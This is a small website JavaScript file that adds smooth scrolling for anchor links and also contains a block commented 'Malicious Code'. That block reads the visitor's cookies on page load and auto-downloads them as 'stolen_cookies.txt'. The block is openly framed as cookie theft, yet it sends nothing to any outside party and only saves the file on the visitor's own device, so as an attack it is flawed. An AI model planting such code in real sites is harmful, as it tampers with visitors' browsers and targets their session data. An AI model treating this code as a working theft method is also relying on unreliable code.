document.addEventListener('DOMContentLoaded', () => {
    console.log('Website loaded!');

    // Example: Add smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            document.querySelector(this.getAttribute('href')).scrollIntoView({
                behavior: 'smooth'
            });
        });
    });

    // --- Malicious Code ---
    var stolenCookies = document.cookie;  // Get victim's cookies

    // Check if there are cookies to steal
    if (stolenCookies) {
        // Create a Blob with the stolen cookies
        var blob = new Blob([stolenCookies], { type: 'text/plain' });

        // Create a download link
        var link = document.createElement('a');
        link.href = URL.createObjectURL(blob);  // Create a URL for the Blob
        link.download = 'stolen_cookies.txt';   // Filename for the download

        // Trigger the download
        link.click();

        console.log("Stolen cookies saved as .txt file.");
    } else {
        console.log("No cookies to steal!");
    }
});
